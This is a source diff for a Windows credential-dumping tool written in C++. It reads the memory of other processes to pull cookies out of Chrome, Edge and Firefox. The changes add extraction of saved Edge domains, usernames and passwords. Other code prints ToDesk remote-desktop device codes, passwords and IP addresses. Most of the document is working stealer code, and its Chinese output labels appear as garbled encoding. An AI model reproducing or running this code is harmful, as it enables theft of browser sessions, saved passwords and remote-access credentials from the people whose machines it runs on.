@@ -1,4 +1,4 @@
-#include <Windows.h>
+Ôªø#include <Windows.h>
 #include <Psapi.h>
 #include <string>
 #include <map>
@@ -58,14 +58,6 @@ struct CanonicalCookieFireFox {
 	int64_t creation_date;
 };
 
-struct TodeskString {
-	int64_t string_part_1;
-	int64_t string_part_2;
-	char len;
-	char paddinglen[7];
-	char maxlen;
-	char paddingmaxlen[7];
-};
 struct CanonicalTodesk {
 	TodeskString temp_password;
 	TodeskString password;
@@ -180,6 +172,45 @@ void ReadStringFireFox(HANDLE hProcess, NsCString string) {
 		}
 		PRINT("%s\n", buf);
 	}
+}
+void ReadPassEdge(HANDLE hProcess, int64_t address, char len) {
+	unsigned char* buf = (unsigned char*)malloc(len + 1);
+	if (buf == 0 || !ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(address), buf, len + 1, nullptr)) {
+		PRINT("Failed to read cookie value");
+		free(buf);
+		return;
+	}
+	buf[len] = '\0';
+
+	const char* http = NULL;
+	char* domain = NULL;
+	char* username = NULL;
+	char* password = NULL;
+	char* context = NULL;
+
+	char* token = strtok_s((char*)buf, " ", &context);
+	if (token) domain = token;
+	if (token) {
+		domain = token;
+		size_t len = strlen(domain);
+		if (len > 0) {
+			if (domain[len - 1] == 's') {
+				http = "https";
+				domain[len - 5] = '\0';
+			}
+			else {
+				http = "http";
+				domain[len - 4] = '\0';
+			}
+		}
+	}
+	token = strtok_s(NULL, " ", &context);
+	if (token) username = token;
+	token = strtok_s(NULL, " ", &context);
+	if (token) password = token;
+	PRINT("    Domain:   %s://%s\n", http, domain);
+	PRINT("    Username: %s\n", username);
+	PRINT("    Password: %s\n", password);
 }
 void ReadStringTodesk(HANDLE hProcess, TodeskString string, int64_t address) {
 	unsigned char* buf = (unsigned char*)malloc(string.len + 1);
@@ -329,6 +360,7 @@ void PrintValuesEdge(CanonicalCookieEdge cookie, HANDLE hProcess) {
 
 	PRINT("\n");
 }
+
 void PrintValuesFireFox(CanonicalCookieFireFox cookie, HANDLE hProcess) {
 	PRINT("    Name: ");
 	ReadStringFireFox(hProcess, cookie.name);
@@ -347,44 +379,44 @@ void PrintValuesFireFox(CanonicalCookieFireFox cookie, HANDLE hProcess) {
 	PRINT("\n");
 }
 void PrintValuesTodesk(CanonicalTodesk todesk, HANDLE hProcess, int64_t address) {
-	PRINT("    …Ë±∏¥˙¬Î: ");
+	PRINT("    ËÆæÂ§á‰ª£Á†Å: ");
 	ReadStringTodesk(hProcess, todesk.code, address + 0x100);
-	PRINT("    ¡Ÿ ±√‹¬Î: ");
+	PRINT("    ‰∏¥Êó∂ÂØÜÁ†Å: ");
 	ReadStringTodesk(hProcess, todesk.temp_password, address);
-	PRINT("    ∞≤»´√‹¬Î: ");
+	PRINT("    ÂÆâÂÖ®ÂØÜÁ†Å: ");
 	ReadStringTodesk(hProcess, todesk.password, address + 0x20);
-	PRINT("    AppDataƒø¬º: ");
+	PRINT("    AppDataÁõÆÂΩï: ");
 	ReadStringTodeskPath(hProcess, todesk.appdata_dir);
-	PRINT("    ≈‰÷√Œƒº˛: ");
+	PRINT("    ÈÖçÁΩÆÊñá‰ª∂: ");
 	ReadStringTodeskPath(hProcess, todesk.config_file);
-	PRINT("    ∏˘ƒø¬º: ");
+	PRINT("    Ê†πÁõÆÂΩï: ");
 	ReadStringTodeskPath(hProcess, todesk.root_dir);
-	PRINT("    ∆¡ƒª∑÷±Ê¬ : ");
+	PRINT("    Â±èÂπïÂàÜËæ®Áéá: ");
 	ReadStringTodesk(hProcess, todesk.screenre_solution, address + 0xC0);
-	PRINT("    ¡Ÿ ±√‹¬Î∏¸–¬ ±º‰: ");
+	PRINT("    ‰∏¥Êó∂ÂØÜÁ†ÅÊõ¥Êñ∞Êó∂Èó¥: ");
 	ReadStringTodesk(hProcess, todesk.update_time, address + 0xE0);
 	PRINT("\n");
 }
 void PrintValuesTodeskList(CanonicalTodeskList todesk, HANDLE hProcess, int64_t address) {
-	PRINT("    …Ë±∏√˚≥∆: ");
+	PRINT("    ËÆæÂ§áÂêçÁß∞: ");
 	ReadStringTodesk(hProcess, todesk.name, address);
-	PRINT("    …Ë±∏¥˙¬Î: ");
+	PRINT("    ËÆæÂ§á‰ª£Á†Å: ");
 	ReadStringTodesk(hProcess, todesk.code, address + 0x20);
-	PRINT("    IPµÿ÷∑: ");
+	PRINT("    IPÂú∞ÂùÄ: ");
 	ReadStringTodesk(hProcess, todesk.ip, address + 0x60);
 	PRINT("\n");
 }
 void PrintValuesTodeskListWithPass(CanonicalTodeskListWithPass todesk, HANDLE hProcess, int64_t address) {
-	PRINT("    …Ë±∏√˚≥∆: ");
+	PRINT("    ËÆæÂ§áÂêçÁß∞: ");
 	ReadStringTodesk(hProcess, todesk.name, address);
-	PRINT("    …Ë±∏¥˙¬Î: ");
+	PRINT("    ËÆæÂ§á‰ª£Á†Å: ");
 	ReadStringTodesk(hProcess, todesk.code, address + 0x20);
-	PRINT("    √‹¬Î: ");
+	PRINT("    ÂØÜÁ†Å: ");
 	ReadStringTodesk(hProcess, todesk.pass, address + 0x40);
 	PRINT("\n");
 }
 
-void ProcessNodeValue(HANDLE hProcess, uintptr_t Valueaddr, AppLication targetBrowser) {
+void ProcessNodeValue(HANDLE hProcess, uintptr_t Valueaddr, AppLication targetBrowser, AppMode mode) {
 
 	if (targetBrowser == Chrome)
 	{
@@ -398,12 +430,17 @@ void ProcessNodeValue(HANDLE hProcess, uintptr_t Valueaddr, AppLication targetBr
 	}
 	else if (targetBrowser == Edge)
 	{
-		CanonicalCookieEdge cookie = { 0 };
-		if (!ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(Valueaddr), &cookie, sizeof(CanonicalCookieEdge), nullptr)) {
-			PRINT("Failed to read cookie struct");
-			return;
+		if (mode == Pass) {
+
 		}
-		PrintValuesEdge(cookie, hProcess);
+		else {
+			CanonicalCookieEdge cookie = { 0 };
+			if (!ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(Valueaddr), &cookie, sizeof(CanonicalCookieEdge), nullptr)) {
+				PRINT("Failed to read cookie struct");
+				return;
+			}
+			PrintValuesEdge(cookie, hProcess);
+		}
 	}
 	else if (targetBrowser == FireFox)
 	{
@@ -419,17 +456,16 @@ void ProcessNodeValue(HANDLE hProcess, uintptr_t Valueaddr, AppLication targetBr
 	}
 
 }
-
-void ProcessNode(HANDLE hProcess, const Node& node, AppLication targetBrowser) {
+void ProcessNode(HANDLE hProcess, const Node& node, AppLication targetBrowser, AppMode mode) {
 	PRINT("Cookie Key: ");
 	ReadStringChrome(hProcess, node.key);
 	PRINT("Attempting to read cookie values from address:  0x%p\n", (void*)node.valueAddress);
-	ProcessNodeValue(hProcess, node.valueAddress, targetBrowser);
+	ProcessNodeValue(hProcess, node.valueAddress, targetBrowser, mode);
 
 	if (node.left != 0) {
 		Node leftNode;
 		if (ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(node.left), &leftNode, sizeof(Node), nullptr))
-			ProcessNode(hProcess, leftNode, targetBrowser);
+			ProcessNode(hProcess, leftNode, targetBrowser, mode);
 		else
 			PRINT("Error reading left node");
 	}
@@ -437,13 +473,41 @@ void ProcessNode(HANDLE hProcess, const Node& node, AppLication targetBrowser) {
 	if (node.right != 0) {
 		Node rightNode;
 		if (ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(node.right), &rightNode, sizeof(Node), nullptr))
-			ProcessNode(hProcess, rightNode, targetBrowser);
+			ProcessNode(hProcess, rightNode, targetBrowser, mode);
+		else
+			PRINT("Error reading right node");
+	}
+}
+void ProcessPassNode(HANDLE hProcess, const PassNode& node, int64_t nodeAddress, AppLication targetBrowser, AppMode mode) {
+	PRINT("\nAttempting to read cookie values from address:  0x%p\n", (void*)node.valueAddress);
+	int64_t reslut = node.valueAddress & 0xFFFF000000000000;
+	if (node.tag > 0x16) {
+		ReadPassEdge(hProcess, node.valueAddress, node.len);
+	}
+	else
+	{
+		ReadPassEdge(hProcess, nodeAddress + 0x20, node.tag);
+	}
+
+
+	if (node.left != 0) {
+		PassNode leftNode;
+		if (ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(node.left), &leftNode, sizeof(PassNode), nullptr))
+			ProcessPassNode(hProcess, leftNode, node.left, targetBrowser, mode);
+		else
+			PRINT("Error reading left node");
+	}
+
+	if (node.right != 0) {
+		PassNode rightNode;
+		if (ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(node.right), &rightNode, sizeof(PassNode), nullptr))
+			ProcessPassNode(hProcess, rightNode, node.right, targetBrowser, mode);
 		else
 			PRINT("Error reading right node");
 	}
 }
 
-void WalkCookieMap(HANDLE hProcess, uintptr_t cookieMapAddress, AppLication targetBrowser) {
+void WalkCookieMap(HANDLE hProcess, uintptr_t cookieMapAddress, AppLication targetBrowser, AppMode mode) {
 	if (targetBrowser == FireFox) {
 		uintptr_t cookieEntry;
 		if (!ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(cookieMapAddress), &cookieEntry, sizeof(uintptr_t), nullptr)) {
@@ -457,7 +521,7 @@ void WalkCookieMap(HANDLE hProcess, uintptr_t cookieMapAddress, AppLication targ
 		}
 		uintptr_t cookieDataAddress = cookieStruct.cookieDataAddress;
 		PRINT("[+] Address of cookieData: 0x%p\n", cookieDataAddress);
-		ProcessNodeValue(hProcess, cookieDataAddress, targetBrowser);
+		ProcessNodeValue(hProcess, cookieDataAddress, targetBrowser, mode);
 	}
 	else {
 		RootNode cookieMap;
@@ -477,19 +541,31 @@ void WalkCookieMap(HANDLE hProcess, uintptr_t cookieMapAddress, AppLication targ
 			PRINT("[*] This Cookie map was empty\n");
 			return;
 		}
-		Node firstNode;
-		if (ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(cookieMap.firstNode), &firstNode, sizeof(Node), nullptr) && &firstNode != nullptr)
-			ProcessNode(hProcess, firstNode, targetBrowser);
-		else
-			PRINT("Error reading first node\n");
+		if (mode == Pass) {
+			PassNode firstNode;
+			if (ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(cookieMap.firstNode), &firstNode, sizeof(PassNode), nullptr) && &firstNode != nullptr) {
+				ProcessPassNode(hProcess, firstNode, cookieMap.firstNode, targetBrowser, mode);
+			}
+			else
+				PRINT("Error reading first node\n");
+		}
+		else {
+			Node firstNode;
+			if (ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(cookieMap.firstNode), &firstNode, sizeof(Node), nullptr) && &firstNode != nullptr) {
+				ProcessNode(hProcess, firstNode, targetBrowser, mode);
+			}
+			else
+				PRINT("Error reading first node\n");
+		}
+
 	}
 }
-void WalkRemoteApp(HANDLE hProcess, uintptr_t patternAddress, AppLication targetApplication, ToDeskMode mode) {
+void WalkRemoteApp(HANDLE hProcess, uintptr_t patternAddress, AppLication targetApplication, AppMode mode) {
 	CanonicalTodesk todesk;
 	CanonicalTodeskList todesklist;
 	CanonicalTodeskListWithPass todesklistwithpass;
 	switch (mode) {
-	case ListWithPass:
+	case Pass:
 		if (!ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(patternAddress), &todesklistwithpass, sizeof(CanonicalTodeskListWithPass), nullptr)) {
 			PRINT("Failed to read the todeskData\n");
 			return;
